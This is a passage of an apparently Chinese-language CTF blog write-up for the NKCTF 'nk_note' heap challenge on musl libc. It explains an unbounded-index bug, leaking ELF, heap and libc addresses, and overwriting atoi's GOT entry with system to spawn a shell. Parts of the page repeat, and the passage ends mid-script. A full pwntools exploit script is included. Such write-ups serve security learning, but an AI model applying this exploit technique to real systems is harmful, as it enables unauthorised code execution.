/home/a1ph0nse/PwnPractice/CtfGame/NK/note/nk_note</span><br><span class=\"line\">0x55bccd41a000     0x55bccd41b000 r--p     1000   2000 /home/a1ph0nse/PwnPractice/CtfGame/NK/note/nk_note</span><br><span class=\"line\">0x55bccd41b000     0x55bccd41c000 r--p     1000   2000 /home/a1ph0nse/PwnPractice/CtfGame/NK/note/nk_note</span><br><span class=\"line\">0x55bccd41c000     0x55bccd41d000 rw-p     1000   3000 /home/a1ph0nse/PwnPractice/CtfGame/NK/note/nk_note</span><br><span class=\"line\">0x55bccd41d000     0x55bccd41f000 rw-p     2000   5000 /home/a1ph0nse/PwnPractice/CtfGame/NK/note/nk_note</span><br></pre></td></tr></table></figure>\n\n<p>由上我们可以泄露<code>elfbase</code>和<code>heapbase</code>，为了防止出问题，泄露地址后要把被覆盖的内容恢复。</p>\n<p>通过<code>elfbase</code>，我们可以定位到<code>ptr</code>和前面的<code>GOT</code>表，但要改写内容我们还需要知道<code>libcbase</code>，这样才知道要将<code>GOT</code>表项改写为什么内容。</p>\n<p>看了WP才知道，<strong>libc会将小的堆放在bss段中</strong>，因此我们可以申请一个小的堆，在里面写上<code>GOT</code>表项的地址，借此泄露出<code>libcbase</code>，并改写<code>GOT</code>表项<code>get shell</code>。</p>\n<p>这里选择改写<code>atoi</code>为<code>system</code>并输入<code>/bin/sh\\x00</code>来<code>get shell</code></p>\n<p><strong>exp:</strong></p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;nk_note&#x27;</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&#x27;./libc.so&#x27;</span>)</span><br><span class=\"line\">p=process(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\"><span class=\"comment\">#p=process([&quot;qemu-arm&quot;,&quot;-L&quot;,&quot;...&quot;,&quot;-g&quot;, &quot;8888&quot;, &quot;./&quot;+filename])</span></span><br><span class=\"line\"><span class=\"comment\">#p=process([&#x27;./ld-2.23.so&#x27;,&#x27;./&#x27;+filename],env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.23.so&#x27;&#125;)</span></span><br><span class=\"line\"><span class=\"comment\">#p=remote(&#x27;&#x27;,)</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recvline(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">cmd=<span class=\"string\">&#x27;\\n&#x27;</span></span>):</span><br><span class=\"line\">  gdb.attach(p,cmd)</span><br><span class=\"line\">  pause()</span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">idx,size,content</span>):</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;your choice: &quot;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;Index: &quot;</span>)</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;Size: &quot;</span>)</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;Content: &quot;</span>)</span><br><span class=\"line\">  s(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx,size,content</span>):</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;your choice: &quot;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;Index: &quot;</span>)</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;Size: &quot;</span>)</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;Content: &quot;</span>)</span><br><span class=\"line\">  s(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;your choice: &quot;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;Index: &quot;</span>)</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;your choice: &quot;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&quot;4&quot;</span>)</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;Index: &quot;</span>)</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># leak heapbase</span></span><br><span class=\"line\">show(<span class=\"number\">16</span>)</span><br><span class=\"line\">heapaddr=uu64(ru(<span class=\"string\">&#x27;\\n&#x27;</span>)[:-<span class=\"number\">1</span>])</span><br><span class=\"line\">leak(<span class=\"string\">&quot;heapaddr&quot;</span>,<span class=\"built_in\">hex</span>(heapaddr))</span><br><span class=\"line\">heapbase=heapaddr-<span class=\"number\">0x248</span></span><br><span class=\"line\">leak(<span class=\"string\">&quot;heapbase&quot;</span>,<span class=\"built_in\">hex</span>(heapbase))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># leak elfbase</span></span><br><span class=\"line\">paylooad=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x10</span></span><br><span class=\"line\">edit(<span class=\"number\">16</span>,<span class=\"number\">0x10</span>,paylooad)</span><br><span class=\"line\">show(<span class=\"number\">16</span>)</span><br><span class=\"line\">ru(<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x10</span>)</span><br><span class=\"line\">elfbase=uu64(ru(<span class=\"string\">&#x27;\\n&#x27;</span>)[:-<span class=\"number\">1</span>])-<span class=\"number\">0x4120</span></span><br><span class=\"line\">leak(<span class=\"string\">&quot;elfbase&quot;</span>,<span class=\"built_in\">hex</span>(elfbase))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># recover the meta</span></span><br><span class=\"line\">payload=p64(heapaddr)+p64(heapbase+<span class=\"number\">0xe0</span>)</span><br><span class=\"line\">edit(<span class=\"number\">16</span>,<span class=\"number\">0x10</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">ptr_addr=elfbase+<span class=\"number\">0x40A0</span></span><br><span class=\"line\">leak(<span class=\"string\">&quot;ptr_addr&quot;</span>,<span class=\"built_in\">hex</span>(ptr_addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># note_addr=ptr+0x2f10</span></span><br><span class=\"line\">note_addr=ptr_addr+<span class=\"number\">0x2f10</span></span><br><span class=\"line\">leak(<span class=\"string\">&quot;note_addr&quot;</span>,<span class=\"built_in\">hex</span>(note_addr))</span><br><span class=\"line\"></span><br><span class=\"line\">atoi_got=elfbase+elf.got[<span class=\"string\">&#x27;atoi&#x27;</span>]</span><br><span class=\"line\">leak(<span class=\"string\">&quot;atoi_got&quot;</span>,<span class=\"built_in\">hex</span>(atoi_got))</span><br><span class=\"line\">payload=p64(atoi_got)+<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x28</span></span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"number\">0x30</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># offset=0x2f10/0x8=0x5e2</span></span><br><span class=\"line\"><span class=\"comment\"># leak libc</span></span><br><span class=\"line\">show(<span class=\"number\">0x5e2</span>)</span><br><span class=\"line\">libc_addr=uu64(ru(<span class=\"string\">&#x27;\\n&#x27;</span>)[:-<span class=\"number\">1</span>])</span><br><span class=\"line\">leak(<span class=\"string\">&quot;libc_addr&quot;</span>,<span class=\"built_in\">hex</span>(libc_addr))</span><br><span class=\"line\">libcbase=libc_addr-libc.sym[<span class=\"string\">&#x27;atoi&#x27;</span>]</span><br><span class=\"line\">leak(<span class=\"string\">&quot;libcbase&quot;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\"></span><br><span class=\"line\">sys_addr=libcbase+libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\"><span class=\"comment\"># get shell</span></span><br><span class=\"line\">payload=p64(sys_addr)</span><br><span class=\"line\">edit(<span class=\"number\">0x5e2</span>,<span class=\"number\">0x8</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">r()</span><br><span class=\"line\">s(<span class=\"string\">&quot;/bin/sh\\x00&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\"># debug()</span></span><br><span class=\"line\"></span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n\n\n\n","site":{"data":{}},"excerpt":"<p>nkctf的一道题，看到libc是musl的之后没仔细看就跑去学musl了，结果上了大当，这题和musl libc没什么关系。</p>","more":"<h2 id=\"查壳\"><a href=\"#查壳\" class=\"headerlink\" title=\"查壳\"></a>查壳</h2><p>用的musl libc1.2.3。</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">musl libc (x86_64)</span><br><span class=\"line\">Version 1.2.3</span><br><span class=\"line\">Dynamic Program Loader</span><br></pre></td></tr></table></figure>\n\n<p>当时没注意到<code>RELRO: Partial RELRO</code>，也就是说<strong>可以改写GOT表</strong></p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[*] <span class=\"string\">&#x27;/home/a1ph0nse/PwnPractice/CtfGame/NK/note/nk_note&#x27;</span></span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"逆向分析\"><a href=\"#逆向分析\" class=\"headerlink\" title=\"逆向分析\"></a>逆向分析</h2><p>具有增删查改的功能。</p>\n<p>首先指定要的操作，然后输入idx</p>\n<p>增：堆指针从0x40A0开始，chunk的size可以任意指定，<code>malloc</code>后存入<code>(&amp;ptr)[idx]</code>，并写入size大小的content。</p>\n<p>删：释放idx指定的chunk，并且在对应位置清0。</p>\n<p>查：<code>puts((const char *)(&amp;ptr)[idx])</code>。</p>\n<p>改：向idx指定的chunk写入size大小的content。</p>\n<p>存在问题：</p>\n<ul>\n<li><code>idx</code>是<code>int</code>类型且没有限制，可以超出堆指针的范围，可以是负数。</li>\n<li>改的时候没有对<code>size</code>进行检测</li>\n</ul>\n<h2 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h2><p>堆指针在<code>bss</code>段，<code>idx</code>可以下标溢出写到其他地方。这里写的方法是从<code>ptr+offset</code>处取出一个地址<code>addr</code>，修改<code>addr</code>指向位置的内容。</p>\n<p>这里的GOT表可以写，但因为有PIE我们不能直接定位到GOT表，要先想办法泄露地址。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x55bccd41c0a0 &lt;ptr&gt;:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x55bccd41c0b0 &lt;ptr+16&gt;:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x55bccd41c0c0 &lt;ptr+32&gt;:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x55bccd41c0d0 &lt;ptr+48&gt;:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x55bccd41c0e0 &lt;ptr+64&gt;:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x55bccd41c0f0 &lt;ptr+80&gt;:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x55bccd41c100 &lt;ptr+96&gt;:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x55bccd41c110 &lt;ptr+112&gt;:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x55bccd41c120:\t0x000055bcced64018\t0x0000ff0000000000</span><br></pre></td></tr></table></figure>\n\n<p>可以看到在bss段后面ptr+0x80的位置有一个堆地址0x000055bcced64018，使用<code>mheap</code>可以看到他是<code>active[23]</code>的一个<code>meta</code>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">active[23] : 0x55bcced64018 (mem: 0x55bccd41c120)</span><br><span class=\"line\">pwndbg&gt; p *(struct meta*)0x55bcced64018</span><br><span class=\"line\">$1 = &#123;</span><br><span class=\"line\">  prev = 0x55bcced64248,</span><br><span class=\"line\">  next = 0x55bcced640e0,</span><br><span class=\"line\">  mem = 0x55bccd41c120, # 与elfbase的偏移是固定的</span><br><span class=\"line\">  avail_mask = 0,</span><br><span class=\"line\">  freed_mask = 1,</span><br><span class=\"line\">  last_idx = 0,</span><br><span class=\"line\">  freeable = 0,</span><br><span class=\"line\">  sizeclass = 23,</span><br><span class=\"line\">  maplen = 0</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>而其中的<code>mem</code>与程序基地址的偏移是固定的，可以通过它泄露出基地址。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">         Start                End Perm     Size Offset File</span><br><span class=\"line\">0x55bccd418000     0x55bccd419000 r--p     1000      0 /home/a1ph0nse/PwnPractice/CtfGame/NK/note/nk_note</span><br><span class=\"line\">0x55bccd419000     0x55bccd41a000 r-xp     1000   1000 /home/a1ph0nse/PwnPractice/CtfGame/NK/note/nk_note</span><br><span class=\"line\">0x55bccd41a000     0x55bccd41b000 r--p     1000   2000 /home/a1ph0nse/PwnPractice/CtfGame/NK/note/nk_note</span><br><span class=\"line\">0x55bccd41b000     0x55bccd41c000 r--p     1000   2000 /home/a1ph0nse/PwnPractice/CtfGame/NK/note/nk_note</span><br><span class=\"line\">0x55bccd41c000     0x55bccd41d000 rw-p     1000   3000 /home/a1ph0nse/PwnPractice/CtfGame/NK/note/nk_note</span><br><span class=\"line\">0x55bccd41d000     0x55bccd41f000 rw-p     2000   5000 /home/a1ph0nse/PwnPractice/CtfGame/NK/note/nk_note</span><br></pre></td></tr></table></figure>\n\n<p>由上我们可以泄露<code>elfbase</code>和<code>heapbase</code>，为了防止出问题，泄露地址后要把被覆盖的内容恢复。</p>\n<p>通过<code>elfbase</code>，我们可以定位到<code>ptr</code>和前面的<code>GOT</code>表，但要改写内容我们还需要知道<code>libcbase</code>，这样才知道要将<code>GOT</code>表项改写为什么内容。</p>\n<p>看了WP才知道，<strong>libc会将小的堆放在bss段中</strong>，因此我们可以申请一个小的堆，在里面写上<code>GOT</code>表项的地址，借此泄露出<code>libcbase</code>，并改写<code>GOT</code>表项<code>get shell</code>。</p>\n<p>这里选择改写<code>atoi</code>为<code>system</code>并输入<code>/bin/sh\\x00</code>来<code>get shell</code></p>\n<p><strong>exp:</strong></p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;nk_note&#x27;</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&#x27;./libc.so&#x27;</span>)</span><br><span class=\"line\">p=process(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\"><span class=\"comment\">#p=process([&quot;qemu-arm&quot;,&quot;-L&quot;,&quot;...&quot;,&quot;-g&quot;, &quot;8888&quot;, &quot;./&quot;+filename])</span></span><br><span class=\"line\"><span class=\"comment\">#p=process([&#x27;./ld-2.23.so&#x27;,&#x27;./&#x27;+filename],env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.23.so&#x27;&#125;)</span></span><br><span class=\"line\"><span class=\"comment\">#p=remote(&#x27;&#x27;,)</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recvline(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">cmd=<span class=\"string\">&#x27;\\n&#x27;</span></span>):</span><br><span class=\"line\">  gdb.attach(p,cmd)</span><br><span class=\"line\">  pause()</span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">idx,size,content</span>):</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;your choice: &quot;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;Index: &quot;</span>)</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;Size: &quot;</span>)</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;Content: &quot;</span>)</span><br><span class=\"line\">  s(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx,size,content</span>):</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;your choice: &quot;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;Index: &quot;</span>)</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;Size: &quot;</span>)</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;Content: &quot;</span>)</span><br><span class=\"line\">  s(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;your choice: &quot;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;Index: &quot;</span>)</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;your choice: &quot;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&quot;4&quot;</span>)</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;Index: &quot;</span>)</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># leak heapbase</span></span><br><span class=\"line\">show(<span class=\"number\">16</span>)</span><br><span class=\"line\">heapaddr=uu64(ru(<span class=\"string\">&#x27;\\n&#x27;</span>)[:-<span class=\"number\">1</span>])</span><br><span class=\"line\">leak(<span class=\"string\">&quot;heapaddr&quot;</span>,<span class=\"built_in\">hex</span>(heapaddr))</span><br><span class=\"line\">heapbase=heapaddr-<span 